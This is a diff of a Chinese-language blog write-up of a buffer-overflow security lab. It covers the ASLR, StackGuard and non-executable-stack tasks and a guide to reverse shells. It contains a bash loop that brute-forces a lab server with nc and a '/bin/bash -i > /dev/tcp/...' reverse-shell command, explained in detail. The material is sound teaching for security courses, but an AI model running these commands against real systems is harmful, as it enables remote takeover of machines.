 <ol type="1">
-<li><p>目标：目标服务器是 10.9.0.8，开放端口为 9090，运行 64
-位程序</p></li>
 <li><p>向目标服务器 10.9.0.7 送消息，然后观察服务器端打印出的信息。发现
 buffer 大小仅为 96 字节。</p>
 <figure>
@@ -643,17 +797,32 @@ alt="image-20231011102851075" />
 发送给目标服务端。查看 ip 发现显示服务器的 ip，成功实现反弹
 shell。（基本同上）</li>
 </ol>
-<h1 id="task-6-experimenting-with-the-address-randomization">8 Task 6:
+<h1 id="task-6-experimenting-with-the-address-randomization">8. Task 6:
 Experimenting with the Address Randomization</h1>
-<ol type="1">
-<li><p>重新启用地址空间布局随机化</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo /sbin/sysctl -w kernel.randomize_va_space=2<br></code></pre></td></tr></table></figure>
+<p>在本实验室开始时，我们关闭了其中一项反措施，即地址空间布局随机化（ASLR）。在本任务中，我们将重新打开它，看看它对攻击有何影响。您可以在虚拟机上运行以下命令启用
+ASLR。这一更改是全局性的，会影响虚拟机中运行的所有容器。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo /sbin/sysctl -w kernel.randomize_va_space=2<br></code></pre></td></tr></table></figure>
 <figure>
 <img
 src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049735.png" srcset="/img/loading.gif" lazyload
 alt="image-20231011103159396" />
 <figcaption aria-hidden="true">image-20231011103159396</figcaption>
-</figure></li>
+</figure>
+<p>请向 1 级和 3 级服务器发送 Hello
+消息，并发送多次。请在报告中汇报您的观察结果，并解释为什么 ASLR
+会增加缓冲区溢出攻击的难度。</p>
+<p>击败 32 位随机化。据报道，在 32 位 Linux 机器上，只有 19
+个位可用于地址随机化。这还远远不够，如果我们运行足够多的攻击次数，就能轻松击中目标。对于
+64 位机器，用于随机化的位数会大幅增加。</p>
+<p>在本任务中，我们将在 32 位 1 级服务器上进行尝试。我们使用 "暴力
+"方法反复攻击服务器，希望我们在有效负载中输入的地址最终是正确的。我们将使用
+1 级攻击中的有效载荷。您可以使用下面的 shell
+脚本无限循环运行易受攻击的程序。如果出现反向
+shell，脚本就会停止，否则就会继续运行。如果你运气不差，应该能在 10
+分钟内获得反向 shell。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/bash</span><br>SECONDS=0<br>value=0<br><span class="hljs-keyword">while</span> <span class="hljs-literal">true</span>; <span class="hljs-keyword">do</span><br>	value=$(( <span class="hljs-variable">$value</span> + <span class="hljs-number">1</span> ))<br>	duration=<span class="hljs-variable">$SECONDS</span><br>	min=$((<span class="hljs-variable">$duration</span> / <span class="hljs-number">60</span>))<br>	sec=$((<span class="hljs-variable">$duration</span> % <span class="hljs-number">60</span>))<br>	<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$min</span> minutes and <span class="hljs-variable">$sec</span> seconds elapsed.&quot;</span><br>	<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;The program has been running <span class="hljs-variable">$value</span> times so far.&quot;</span><br>	<span class="hljs-built_in">cat</span> badfile | nc 10.9.0.5 9090<br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure>
+<p><strong>实验流程：</strong></p>
+<ol type="1">
 <li><p>向 level 1 和 level 3 中服务器发送 Hello
 消息，并发送多次，发现每次地址都在随机变化。<strong>ASLR
 会使缓冲区溢出攻击变得更加困难原因</strong>：意味着攻击者无法事先知道要攻击的特定内存地址，因为它们在每次启动时都会发生变化；不再能够确定可执行代码或关键数据的确切位置；迫使攻击者需要更复杂的技术来发现内存布局，增加了攻击的难度和成本。</p>
@@ -669,12 +838,8 @@ src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/20231011104
 alt="image-20231011103323882" />
 <figcaption aria-hidden="true">image-20231011103323882</figcaption>
 </figure></li>
-<li><p>目标：10.9.0.5:9090，运行32位程序。<strong>解决方案</strong>：无限循环运行易受攻击的程序，暴力破解。Tip：在
-32 位 Linux 机器上，只能使用 19
-个位用于地址随机化。这还远远不够，如果我们运行足够多的攻击足够的次数，我们就能轻松击中目标。对于
-64
-位机器，用于随机化的位数会大大增加，意味着该方法可能不再有效。</p></li>
-<li><p>使用 Level 1 中 exploit.py 重新生成
+<li><p><strong>解决方案</strong>：无限循环运行易受攻击的程序，暴力破解。使用
+Level 1 中 exploit.py 重新生成
 badfile，在本机开启监听，执行暴力破解脚本，16923 次时成功破解。</p>
 <figure>
 <img
@@ -702,10 +867,18 @@ alt="image-20231011103708030" />
 <figcaption aria-hidden="true">image-20231011103708030</figcaption>
 </figure></li>
 </ol>
-<h1 id="task-7-experimenting-with-other-countermeasures">9 Task 7:
+<h1 id="task-7-experimenting-with-other-countermeasures">9. Task 7:
 Experimenting with Other Countermeasures</h1>
 <h2 id="task-7.a-turn-on-the-stackguard-protection">9.1 Task 7.a: Turn
 on the StackGuard Protection</h2>
+<p>许多编译器（如 gcc）都实现了一种名为 StackGuard
+的安全机制，以防止缓冲区溢出。有了这种保护措施，缓冲区溢出攻击就无法奏效。所提供的易受攻击程序在编译时并未启用
+StackGuard 保护机制。在本任务中，我们将打开它，看看会发生什么。</p>
+<p>请进入 server-code 文件夹，移除 gcc 标志中的 -fno-stack-protector
+标志，然后编译 stack.c。我们将只使用
+stack-L1，但不是在容器中运行，而是直接从命令行运行。让我们创建一个可能导致缓冲区溢出的文件，然后输入文件
+stack-L1 的内容。请描述并解释你的观察结果。</p>
+<p><strong>实验流程：</strong></p>
 <ol type="1">
 <li><p>进入 server-code 文件夹，去除 -fno-stack-protector 选项编译
 stack.c，然后将 badfile
@@ -740,6 +913,23 @@ StackGuard
 </ol>
 <h2 id="task-7.b-turn-on-the-non-executable-stack-protection">9.2 Task
 7.b: Turn on the Non-executable Stack Protection</h2>
+<p>操作系统过去允许使用可执行堆栈，但现在情况有所改变：在 Ubuntu
+操作系统中，程序（和共享库）的二进制映像必须声明它们是否需要可执行堆栈，也就是说，它们需要在程序头中标记一个字段。内核或动态链接器会使用该标记来决定是否将该运行程序的堆栈设置为可执行或不可执行。这种标记由
+gcc
+自动完成，它默认情况下会将堆栈设置为不可执行。我们可以在编译时使用"-z
+noexecstack "标记，将堆栈设为不可执行。在前面的任务中，我们使用了"-z
+execstack "来使堆栈可执行。</p>
+<p>在本任务中，我们将使堆栈不可执行。我们将在 shellcode
+文件夹中进行这项实验。调用 shellcode 程序会将 shellcode
+的副本放到堆栈中，然后执行堆栈中的代码。请重新编译 call shellcode.c 到
+a32.out 和 a64.out，不要使用"-z execstack
+"选项。运行它们，描述并解释您的观察结果。</p>
+<p><strong>对抗不可执行堆栈对策</strong>：需要注意的是，不可执行堆栈只是使
+shellcode
+无法在堆栈上运行，但并不能防止缓冲区溢出攻击，因为利用缓冲区溢出漏洞后，还有其他方法可以运行恶意代码。return-to-libc
+攻击就是一个例子。我们为这种攻击设计了一个单独的实验室。如有兴趣，请参阅我们的
+Return-to-Libc 攻击实验室了解详情。</p>
+<p><strong>实验流程：</strong></p>
 <ol type="1">
 <li><p>进入 shellcode 文件夹，去除 -z execstack 编译call_shellcode.c
 并运行，出现报错：<code>Segmentation fault</code></p>
@@ -749,10 +939,51 @@ src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/20231011104
 alt="image-20231011103924910" />
 <figcaption aria-hidden="true">image-20231011103924910</figcaption>
 </figure></li>
-<li><p>需要注意的是，不可执行堆栈只能只能使 shellcode
-无法在堆栈上运行，但并不能完全防止缓冲区溢出攻击，因为利用缓冲区溢出漏洞后，还有其他方法运行恶意代码。return-tolibc
-攻击就是一个例子。</p></li>
 </ol>
+<h1 id="guidelines-on-reverse-shell">10. Guidelines on Reverse
+Shell</h1>
+<p>反向 shell
+的主要思想是将其<strong>标准输入、输出和错误设备</strong>重定向到网络连接上，这样
+shell
+就能从网络连接上获取输入，并将输出打印到网络连接上。连接的另一端是攻击者运行的程序；该程序只需在另一端显示来自
+shell 的内容，并通过网络连接将攻击者输入的内容发送给 shell。</p>
+<p>攻击者常用的一个程序是 netcat，如果使用"-l "选项运行，它就会成为一个
+TCP
+服务器，在指定端口上监听连接。该服务器程序基本上会打印出客户端发送的内容，并将运行服务器的用户输入的内容发送给客户端。在下面的实验中，netcat（简称
+nc）用于监听 9090 端口的连接（让我们只关注第一行）。</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312071121074.png" srcset="/img/loading.gif" lazyload
+alt="image-20231207103728679" />
+<figcaption aria-hidden="true">image-20231207103728679</figcaption>
+</figure>
+<p>上述 nc
+命令将阻塞，等待连接。现在，我们直接在服务器机器（10.0.2.5）上运行以下
+bash 程序，模拟攻击者通过 Shellshock 攻击入侵服务器后运行的程序。该 bash
+命令将触发与攻击者机器 9090 端口的 TCP 连接，并创建一个反向
+shell。我们可以从上面的结果中看到 shell 提示，这表明 shell
+正在服务器机器上运行；我们可以输入 ifconfig 命令来验证 IP 地址确实是
+10.0.2.5，即属于服务器机器的 IP 地址。下面是 bash 命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Server(10.0.2.5):$ /bin/bash -i &gt; /dev/tcp/10.0.2.6/9090 0&lt;&amp;1 2&gt;&amp;1<br></code></pre></td></tr></table></figure>
+<p>上述命令是通常会在被入侵的服务器上执行的命令。它相当复杂，我们将在下文中详细解释：</p>
+<ul>
+<li>"/bin/bash -i"：选项 i 代表交互式，意思是 shell
+必须是交互式的（必须提供 shell 提示）。</li>
+<li>"&gt; /dev/tcp/10.0.2.6/9090"：这会将 shell
+的输出设备（stdout）重定向到 10.0.2.6 的端口 9090 的 TCP 连接。在 Unix
+系统中，stdout 的文件描述符为 1。</li>
+<li>"0&lt;&amp;1":文件描述符 0 代表标准输入设备
+(stdin)。该选项告诉系统使用标准输出设备作为标准输入设备。由于 stdout
+已被重定向到 TCP 连接，该选项基本上表示 shell 程序将从同一 TCP
+连接获取输入。</li>
+<li>"2&gt;&amp;1":文件描述符 2 代表标准错误
+stderr。这会导致错误输出重定向到 stdout，也就是 TCP 连接。</li>
+</ul>
+<p>总之，命令"/bin/bash -i &gt; /dev/tcp/10.0.2.6/9090 0&lt;&amp;1
+2&gt;&amp;1 "会在服务器机器上启动一个 bash shell，其输入来自一个 TCP
+连接，输出到相同的 TCP 连接。在我们的实验中，当在 10.0.2.5 上执行 bash
+shell 命令时，它会连接回在 10.0.2.6 上启动的 netcat 进程。这可以通过
+netcat 显示的 "Connection from 10.0.2.5 ..." 消息确认。</p>
 <p>参考教程：</p>
 <ol type="1">
 <li><a
